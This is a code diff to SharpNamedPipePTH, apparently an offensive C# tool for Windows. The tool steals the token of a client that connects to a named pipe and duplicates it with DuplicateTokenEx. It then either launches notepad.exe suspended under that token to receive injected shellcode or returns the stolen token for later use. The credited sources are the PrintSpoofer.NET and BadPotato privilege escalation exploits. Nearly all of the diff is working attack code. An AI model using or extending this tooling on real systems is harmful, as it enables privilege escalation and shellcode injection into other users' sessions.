@@ -69,7 +69,7 @@ namespace SharpNamedPipePTH
         public enum LogonFlags
         {
             WithProfile = 1,
-            NetCredentialsOnly = 0
+            NetCredentialsOnly = 2
         }
 
         [StructLayout(LayoutKind.Sequential)]
@@ -115,8 +115,27 @@ namespace SharpNamedPipePTH
         [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
 
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern bool CreateProcess(
+   string lpApplicationName,
+   string lpCommandLine,
+   ref SECURITY_ATTRIBUTES lpProcessAttributes,
+   ref SECURITY_ATTRIBUTES lpThreadAttributes,
+   bool bInheritHandles,
+   uint dwCreationFlags,
+   IntPtr lpEnvironment,
+   string lpCurrentDirectory,
+   [In] ref STARTUPINFO lpStartupInfo,
+   out PROCESS_INFORMATION lpProcessInformation);
+
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool RevertToSelf();
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern Boolean SetThreadToken(IntPtr ThreadHandle, IntPtr TokenHandle);
 
         [DllImport("kernel32.dll")]
         public static extern IntPtr WaitForSingleObject(IntPtr handle, int dwMilliseconds);
@@ -209,7 +228,7 @@ namespace SharpNamedPipePTH
             return 0;
         }
 
-        public static void ImpersonateClient(string PipeName, string Binary, byte[] shellcodebytes, string args)
+        public static IntPtr ImpersonateClient(string PipeName, string Binary, byte[] shellcodebytes, string args, string username, string domain)
         {
             // some code from https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/PrintSpoofer.NET/Program.cs, some from https://github.com/BeichenDream/BadPotato/blob/master/Program.cs
 
@@ -237,7 +256,7 @@ namespace SharpNamedPipePTH
                 else
                 {
                     Console.WriteLine("Connect fail!");
-                    return;
+                    return IntPtr.Zero;
                 }
 
                 // Impersonate the token of the incoming connection
@@ -249,7 +268,7 @@ namespace SharpNamedPipePTH
                 else
                 {
                     Console.WriteLine("Impersonation failed!");
-                    return;
+                    return IntPtr.Zero;
                 }
 
                 // Open a handle on the impersonated token
@@ -263,13 +282,14 @@ namespace SharpNamedPipePTH
                 else
                 {
                     Console.WriteLine("OpenThreadToken failed!");
-                    return;
+                    return IntPtr.Zero;
                 }
 
                 // Duplicate the stolen token
                 IntPtr sysToken = IntPtr.Zero;
                 DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION, TOKEN_PRIMARY, out sysToken);
-
+                //sysToken = IntPtr.Zero;
+                //DuplicateToken(tokenHandle, 2, out sysToken);
                 if (result)
                 {
                     Console.WriteLine("DuplicateTokenEx succeeded!");
@@ -277,12 +297,24 @@ namespace SharpNamedPipePTH
                 else
                 {
                     Console.WriteLine("DuplicateTokenEx failed!");
-                    return;
+                    return IntPtr.Zero;
                 }
+                Globals.UpdateIntPtrToken(sysToken);
+                //RevertToSelf();
+                //bool setThreadsuccess = SetThreadToken(IntPtr.Zero, sysToken);
+                /*
+                if(setThreadsuccess)
+                {
+                    Console.WriteLine("Set Duplicated token for current thread");
 
+                }
+                else
+                {
+                    Console.WriteLine("Duplicated token set Thread failed");
+                }*/
                 // Get the impersonated identity and revert to self to ensure we have impersonation privs
-                String name = WindowsIdentity.GetCurrent().Name;
-                Console.WriteLine($"Impersonated user is: {name}.");
+                //String name = WindowsIdentity.GetCurrent().Name;
+                //Console.WriteLine($"Impersonated user is: {name}.");
 
                 if (shellcodebytes != null)
                 {
@@ -294,7 +326,7 @@ namespace SharpNamedPipePTH
                     sInfo.cb = Marshal.SizeOf(sInfo);
 
                     binary = @"C:\windows\system32\notepad.exe";
-
+                   
                     bool output = CreateProcessWithTokenW(sysToken, 0, null, binary, CreationFlags.NewConsole | CreationFlags.Suspended, IntPtr.Zero, null, ref sInfo, out pInfo);
                     Console.WriteLine($"Executed '{binary}' to deploy shellcode in that process!");
 
@@ -386,33 +418,72 @@ namespace SharpNamedPipePTH
                         IntPtr.Zero);
                     Globals.UpdateIntPtr(pInfo.hProcess);
                     Globals.suspendedProcessId = pInfo.dwProcessId;
+                    return IntPtr.Zero;
 
                 }
                 else
                 {
-                    
-                                        
+
+
                     RevertToSelf();
-                    name = WindowsIdentity.GetCurrent().Name;
-                    Console.WriteLine($"RevToSelf, got old user again: {name}.");
+                    //name = WindowsIdentity.GetCurrent().Name;
+                    //Console.WriteLine($"RevToSelf, got old user again: {name}.");
 
                     // Spawn a new process with the duplicated token, a desktop session, and the created profile
-                    PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
-                    STARTUPINFO sInfo = new STARTUPINFO();
                     
+                    /*
+                    SharpNamedPipePTH.Win32.Natives.PROCESS_INFORMATION pInfo = new SharpNamedPipePTH.Win32.Natives.PROCESS_INFORMATION();
+                    SharpNamedPipePTH.Win32.Natives.STARTUPINFO sInfo = new SharpNamedPipePTH.Win32.Natives.STARTUPINFO();
+
+                    sInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
+                    SharpNamedPipePTH.Win32.Natives.LogonFlags logonFlags = SharpNamedPipePTH.Win32.Natives.LogonFlags.NetCredentialsOnly;
+                    
+                    */
+                    STARTUPINFO sInfo = new STARTUPINFO();
                     sInfo.cb = Marshal.SizeOf(sInfo);
+                    PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
 
-                    bool output = CreateProcessWithTokenW(sysToken, 0, binary, args, CreationFlags.NewConsole | CreationFlags.Suspended , IntPtr.Zero, null, ref sInfo, out pInfo);
-                    Console.WriteLine($"Executed '{binary}' in Process-ID '{pInfo.dwProcessId}'with impersonated token!");
-                    Console.WriteLine($"Process Handle: '{pInfo.hProcess}'");
-
+                    // Use normal CreateProcess and create in suspended mode
+                    // create Startupinfo and process info
+                    /*
+                    STARTUPINFO sa = new STARTUPINFO();
+                    sa.cb = Marshal.SizeOf(sa);
+                    PROCESS_INFORMATION pInfo2 = new PROCESS_INFORMATION();
+                    Console.WriteLine("Creating Process");
+                    if(CreateProcess(null, binary, ref securityAttributes, ref securityAttributes, false, (uint)SharpNamedPipePTH.Win32.Natives.CreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref sa, out pInfo2))
+                    {
+                        Console.WriteLine($"Executed '{binary}' in Process-ID '{pInfo.dwProcessId}'with impersonated token!");
+                        Console.WriteLine($"Process Handle: '{pInfo.hProcess}'");
+                    }
+                    else
+                    {
+                        Console.WriteLine("Process Creation failed");
+                        Console.WriteLine(Marshal.GetLastWin32Error());
+                    }
+                    */
+                    
+                    //if (/*SharpNamedPipePTH.Win32.Natives.CreateProcessWithLogonW(username, "", domain, logonFlags,  binary, args, SharpNamedPipePTH.Win32.Natives.CreationFlags.CREATE_SUSPENDED, 0, null, ref sInfo, out pInfo))*/CreateProcessWithTokenW(sysToken, LogonFlags.NetCredentialsOnly, binary, args, CreationFlags.NewConsole | CreationFlags.Suspended , IntPtr.Zero, null, ref sInfo, out pInfo))
+                    /*{ 
+                        Console.WriteLine($"Executed '{binary}' in Process-ID '{pInfo.dwProcessId}'with impersonated token!");
+                        Console.WriteLine($"Process Handle: '{pInfo.hProcess}'");
+                    }
+                    else
+                    {
+                        Console.WriteLine("Process Creation failed");
+                        Console.WriteLine(Marshal.GetLastWin32Error());
+                    }
                     Globals.UpdateIntPtr(pInfo.hProcess);
                     Console.WriteLine($"Process Handle: '{Globals.suspendedProcessHandle}'");
                     Globals.suspendedProcessId = pInfo.dwProcessId;
+                    */
+                    Globals.UpdateIntPtrToken(sysToken);
+                    
+                    return sysToken;
                 }
-                
+
+                return IntPtr.Zero;
             }
-            
+            return IntPtr.Zero;
         }
     }
 }
